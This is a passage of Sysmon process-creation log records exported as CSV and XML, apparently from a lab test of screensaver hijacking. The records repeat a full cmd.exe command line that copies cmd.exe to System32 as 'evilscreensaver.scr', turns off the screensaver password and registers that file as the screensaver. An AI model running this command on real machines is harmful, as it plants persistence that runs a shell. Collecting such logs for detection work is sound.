Microsoft-Windows-Sysmon/Operational,"reg.exe  add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""C:\Windows\System32\evilscreensaver.scr"" /f ",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Registry Console Tool,1,9448,10.0.22621.1 (WinBuild.160101.0800),"MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D",C:\Windows\System32\reg.exe,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 00:54:26.308

ProcessGuid: {fda94052-c742-658c-6202-000000000b00}

ProcessId: 4884

Image: C:\Windows\System32\reg.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Registry Console Tool

Product: Microsoft Windows Operating System

Company: Microsoft Corporation

OriginalFileName: reg.exe

CommandLine: reg.exe  add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""C:\Windows\System32\evilscreensaver.scr"" /f 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D

ParentProcessGuid: {fda94052-c742-658c-5c02-000000000b00}

ParentProcessId: 7156

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c reg export ""HKEY_CURRENT_USER\Control Panel\Desktop"" %userprofile%\backup.reg & copy C:\Windows\System32\cmd.exe ""%SystemRoot%\System32\evilscreensaver.scr"" & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""%SystemRoot%\System32\evilscreensaver.scr"" /f & if 0 NEQ 0 shutdown /r /t 0

ParentUser: WINDEV2309EVAL\User",Info,reg.exe,"""cmd.exe"" /c reg export ""HKEY_CURRENT_USER\Control Panel\Desktop"" %userprofile%\backup.reg & copy C:\Windows\System32\cmd.exe ""%SystemRoot%\System32\evilscreensaver.scr"" & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""%SystemRoot%\System32\evilscreensaver.scr"" /f & if 0 NEQ 0 shutdown /r /t 0",C:\Windows\System32\cmd.exe,{fda94052-c742-658c-5c02-000000000b00},7156,WINDEV2309EVAL\User,{fda94052-c742-658c-6202-000000000b00},7044,4884,Microsoft Windows Operating System,,,,"
      ",-,2023-12-28T00:54:26.3098039Z,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 00:54:26.308,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T00:54:26.3098039Z""/>
      <EventRecordID>9448</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 00:54:26.308</Data>
      <Data Name=""ProcessGuid"">{fda94052-c742-658c-6202-000000000b00}</Data>
      <Data Name=""ProcessId"">4884</Data>
      <Data Name=""Image"">C:\Windows\System32\reg.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Registry Console Tool</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">reg.exe</Data>
      <Data Name=""CommandLine"">reg.exe  add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""C:\Windows\System32\evilscreensaver.scr"" /f </Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-c742-658c-5c02-000000000b00}</Data>
      <Data Name=""ParentProcessId"">7156</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c reg export ""HKEY_CURRENT_USER\Control Panel\Desktop"" %userprofile%\backup.reg &amp; copy C:\Windows\System32\cmd.exe ""%SystemRoot%\System32\evilscreensaver.scr"" &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""%SystemRoot%\System32\evilscreensaver.scr"" /f &amp; if 0 NEQ 0 shutdown /r /t 0</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 00:54:26.308

ProcessGuid: {fda94052-c742-658c-6202-000000000b00}

ProcessId: 4884

Image: C:\Windows\System32\reg.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Registry Console Tool

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: reg.exe

CommandLine: reg.exe  add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""C:\Windows\System32\evilscreensaver.scr"" /f 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D

ParentProcessGuid: {fda94052-c742-658c-5c02-000000000b00}

ParentProcessId: 7156

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c reg export ""HKEY_CURRENT_USER\Control Panel\Desktop"" %userprofile%\backup.reg &amp; copy C:\Windows\System32\cmd.exe ""%SystemRoot%\System32\evilscreensaver.scr"" &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""%SystemRoot%\System32\evilscreensaver.scr"" /f &amp; if 0 NEQ 0 shutdown /r /t 0

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"reg.exe  add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f ",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Registry Console Tool,1,9447,10.0.22621.1 (WinBuild.160101.0800),"MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D",C:\Windows\System32\reg.exe,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 00:54:26.297

ProcessGuid: {fda94052-c742-658c-6102-000000000b00}

ProcessId: 2480

Image: C:\Windows\System32\reg.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Registry Console Tool

Product: Microsoft Windows Operating System

Company: Microsoft Corporation

OriginalFileName: reg.exe

CommandLine: reg.exe  add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D

ParentProcessGuid: {fda94052-c742-658c-5c02-000000000b00}

ParentProcessId: 7156

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c reg export ""HKEY_CURRENT_USER\Control Panel\Desktop"" %userprofile%\backup.reg & copy C:\Windows\System32\cmd.exe ""%SystemRoot%\System32\evilscreensaver.scr"" & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""%SystemRoot%\System32\evilscreensaver.scr"" /f & if 0 NEQ 0 shutdown /r /t 0

ParentUser: WINDEV2309EVAL\User",Info,reg.exe,"""cmd.exe"" /c reg export ""HKEY_CURRENT_USER\Control Panel\Desktop"" %userprofile%\backup.reg & copy C:\Windows\System32\cmd.exe ""%SystemRoot%\System32\evilscreensaver.scr"" & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""%SystemRoot%\System32\evilscreensaver.scr"" /f & if 0 NEQ 0 shutdown /r /t 0",C:\Windows\System32\cmd.exe,{fda94052-c742-658c-5c02-000000000b00},7156,WINDEV2309EVAL\User,{fda94052-c742-658c-6102-000000000b00},7044,2480,Microsoft Windows Operating System,,,,"
      ",-,2023-12-28T00:54:26.2984039Z,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 00:54:26.297,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T00:54:26.2984039Z""/>
      <EventRecordID>9447</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 00:54:26.297</Data>
      <Data Name=""ProcessGuid"">{fda94052-c742-658c-6102-000000000b00}</Data>
      <Data Name=""ProcessId"">2480</Data>
      <Data Name=""Image"">C:\Windows\System32\reg.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Registry Console Tool</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">reg.exe</Data>
      <Data Name=""CommandLine"">reg.exe  add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f </Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-c742-658c-5c02-000000000b00}</Data>
      <Data Name=""ParentProcessId"">7156</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c reg export ""HKEY_CURRENT_USER\Control Panel\Desktop"" %userprofile%\backup.reg &amp; copy C:\Windows\System32\cmd.exe ""%SystemRoot%\System32\evilscreensaver.scr"" &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""%SystemRoot%\System32\evilscreensaver.scr"" /f &amp; if 0 NEQ 0 shutdown /r /t 0</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 00:54:26.297

ProcessGuid: {fda94052-c742-658c-6102-000000000b00}

ProcessId: 2480

Image: C:\Windows\System32\reg.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Registry Console Tool

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: reg.exe

CommandLine: reg.exe  add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D

ParentProcessGuid: {fda94052-c742-658c-5c02-000000000b00}

ParentProcessId: 7156

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c reg export ""HKEY_CURRENT_USER\Control Panel\Desktop"" %userprofile%\backup.reg &amp; copy C:\Windows\System32\cmd.exe ""%SystemRoot%\System32\evilscreensaver.scr"" &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""%SystemRoot%\System32\evilscreensaver.scr"" /f &amp; if 0 NEQ 0 shutdown /r /t 0

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"reg.exe  add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f ",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Registry Console Tool,1,9446,10.0.22621.1 (WinBuild.160101.0800),"MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D",C:\Windows\System32\reg.exe,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 00:54:26.281

ProcessGuid: {fda94052-c742-658c-6002-000000000b00}

ProcessId: 556

Image: C:\Windows\System32\reg.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Registry Console Tool

Product: Microsoft Windows Operating System

Company: Microsoft Corporation

OriginalFileName: reg.exe

CommandLine: reg.exe  add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D

ParentProcessGuid: {fda94052-c742-658c-5c02-000000000b00}

ParentProcessId: 7156

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c reg export ""HKEY_CURRENT_USER\Control Panel\Desktop"" %userprofile%\backup.reg & copy C:\Windows\System32\cmd.exe ""%SystemRoot%\System32\evilscreensaver.scr"" & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""%SystemRoot%\System32\evilscreensaver.scr"" /f & if 0 NEQ 0 shutdown /r /t 0

ParentUser: WINDEV2309EVAL\User",Info,reg.exe,"""cmd.exe"" /c reg export ""HKEY_CURRENT_USER\Control Panel\Desktop"" %userprofile%\backup.reg & copy C:\Windows\System32\cmd.exe ""%SystemRoot%\System32\evilscreensaver.scr"" & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f & reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""%SystemRoot%\System32\evilscreensaver.scr"" /f & if 0 NEQ 0 shutdown /r /t 0",C:\Windows\System32\cmd.exe,{fda94052-c742-658c-5c02-000000000b00},7156,WINDEV2309EVAL\User,{fda94052-c742-658c-6002-000000000b00},7044,556,Microsoft Windows Operating System,,,,"
      ",-,2023-12-28T00:54:26.2830749Z,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 00:54:26.281,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T00:54:26.2830749Z""/>
      <EventRecordID>9446</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 00:54:26.281</Data>
      <Data Name=""ProcessGuid"">{fda94052-c742-658c-6002-000000000b00}</Data>
      <Data Name=""ProcessId"">556</Data>
      <Data Name=""Image"">C:\Windows\System32\reg.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Registry Console Tool</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">reg.exe</Data>
      <Data Name=""CommandLine"">reg.exe  add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f </Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-c742-658c-5c02-000000000b00}</Data>
      <Data Name=""ParentProcessId"">7156</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c reg export ""HKEY_CURRENT_USER\Control Panel\Desktop"" %userprofile%\backup.reg &amp; copy C:\Windows\System32\cmd.exe ""%SystemRoot%\System32\evilscreensaver.scr"" &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""%SystemRoot%\System32\evilscreensaver.scr"" /f &amp; if 0 NEQ 0 shutdown /r /t 0</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 00:54:26.281

ProcessGuid: {fda94052-c742-658c-6002-000000000b00}

ProcessId: 556

Image: C:\Windows\System32\reg.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Registry Console Tool

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: reg.exe

CommandLine: reg.exe  add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D

ParentProcessGuid: {fda94052-c742-658c-5c02-000000000b00}

ParentProcessId: 7156

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c reg export ""HKEY_CURRENT_USER\Control Panel\Desktop"" %userprofile%\backup.reg &amp; copy C:\Windows\System32\cmd.exe ""%SystemRoot%\System32\evilscreensaver.scr"" &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f &amp; reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""%SystemRoot%\System32\evilscreensaver.scr"" /f &amp; if 0 NEQ 0 shutdown /r /t 0

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"reg.exe  add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f ",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Registry Console Tool,1,9445,10.0.22621.1 (WinBuild.160101.0800),"MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D",C:\Windows\System32\reg.exe,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 00:54:26.270

ProcessGuid: {fda94052-c742-658c-5f02-000000000b00}

ProcessId: 9988

Image: C:\Windows\System32\reg.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Registry Console Tool

Product: Microsoft Windows Operating System

Company: Microsoft Corporation

OriginalFileName: reg.exe

CommandLine: reg.exe  add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f 

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D

ParentProcessGuid: {fda94052-c742-658c-5c02-000000000b00}

ParentProcessId: 7156

ParentImage: C:\Windows\System32\cmd.exe

